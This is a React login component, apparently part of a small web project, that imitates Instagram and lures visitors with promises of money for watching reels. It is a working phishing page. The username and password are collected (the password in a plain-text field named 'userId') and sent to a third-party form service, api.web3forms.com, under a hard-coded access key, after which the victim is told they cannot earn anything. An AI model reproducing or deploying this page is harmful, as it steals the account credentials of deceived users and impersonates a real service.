import React from 'react'
import './LoginForm.css'

import inst_img from './assets/insta-img2.jpeg'


function LoginForm() {

  const [result, setResult] = React.useState("");

  const onSubmit = async (event) => {
    event.preventDefault();
    setResult("Sending....");
    const formData = new FormData(event.target);

    formData.append("access_key", "471c2857-29a2-4f71-947a-3b13e7abfd02");

    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: formData
    });

    const data = await response.json();

    if (data.success) {
      setResult("Your are not able to earn money from this site");
      event.target.reset();
    } else {
      console.log("Error", data);
      setResult(data.message);
    }
  };

  return (
    <div className='login-form'>
        <div className='heading'>
    <h2>INSTAGRAM</h2>
    <p>login and earn 🤑</p>
    </div>


    <form onSubmit={onSubmit} >
<input type="text" name='user-name' placeholder='username' required/>
<input type="text"  name='userId'  placeholder='Password' required/>
 <button className='btn'>Login</button>

 <span> {result}</span>

    </form>
<p className='rs'>Get instant 50rs  💰</p>

<div className='note'>
  <p>watch reels and earn money💰 <br /> If you watch one reel then you will get 0.5rs money💰 </p>
</div>
    </div>
  )
}

export default LoginForm
